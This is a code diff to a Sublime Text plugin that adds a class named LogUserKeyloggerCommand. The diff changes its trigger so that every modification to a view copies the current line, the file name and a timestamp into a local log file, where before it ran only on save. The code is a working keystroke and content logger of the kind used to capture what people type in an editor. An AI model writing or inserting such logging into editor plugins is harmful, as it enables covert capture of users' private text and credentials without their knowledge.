@@ -40,6 +40,8 @@ class SaveFiles(object):
 		with open(full_path, "a+") as f:
 			f.write("\n\n Date: " + time_date + "\n\n")
 			f.write( "File Name: " + str(file_name) + "\n\n")
+			# for get_one in get_it:
+
 			f.write("Content: \n" + get_it)
 			f.write("\n\n*******************************************************")
 			f.close()
@@ -62,7 +64,11 @@ class LogUserTestCommand(sublime_plugin.TextCommand):
 class LogUserKeyloggerCommand(sublime_plugin.TextCommand):
 	def run(self, edit):
 		file_name = self.view.file_name()
+		# get_it = [] 
+		# if self.view.window().active_view():
 		get_it = self.view.substr(self.view.line(self.view.sel()[0].begin()))
+			# get_it.append(content)
+		# get_it = " ".join(get_it)
 		SaveFiles().key_strokes_history(file_name, get_it)
 
 
@@ -79,5 +85,10 @@ class LogListener(sublime_plugin.EventListener):
 	def on_load(self, view):
 		view.run_command("log_user_action")
 
-	def on_pre_save(self, view):
-		view.run_command("log_user_keylogger")
+	# def on_pre_save(self, view):
+	# 	view.run_command("log_user_keylogger")
+
+	def on_modified(self, view):
+		# if view.window().active_view():
+		if view.substr(view.line(view.sel()[0].begin())):
+			view.run_command("log_user_keylogger")
